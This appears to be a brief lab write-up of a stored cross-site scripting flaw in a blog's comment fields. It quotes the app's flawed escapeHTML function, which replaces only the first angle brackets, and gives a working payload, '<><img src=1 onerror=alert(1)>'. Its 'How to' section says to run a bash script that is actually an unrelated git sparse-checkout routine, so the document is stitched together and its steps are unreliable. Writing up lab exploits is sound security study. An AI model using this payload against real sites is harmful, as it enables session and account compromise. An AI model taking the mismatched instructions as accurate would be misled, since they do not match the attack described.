# STORED XSS

## SYNOPSIS
- The target site is vulnerable within the comment fields
- WHen adding a comment to a certain blog post, the comments gets added to the current page
- Looking the source code, the app replaces '<' and '>' with HTML entitites which helps mitigate XSS
```
function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }
```
- However, the escpaed HTML is passed on to an innerHTML 
```
let newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author)
                firstPElement.innerHTML = newInnerHtml
```

## Payload
```<><img src=1 onerror=alert(1)>```

## How to:
- run the script below 

```bash
# grabs the repo name
REPO_NAME="$(echo $2 | grep -oE '[^/]+$')"

git init $REPO_NAME
cd $REPO_NAME

git remote add origin $2
git config core.sparsecheckout true

# specify the sub directory
git config core.sparsecheckout true

# NOTE: MASTER BRANCH SHOULD EXISTS for the command below to work
git pull origin master
```


## Reference
HTML Entities
https://www.w3schools.com/HTML/html_entities.asp

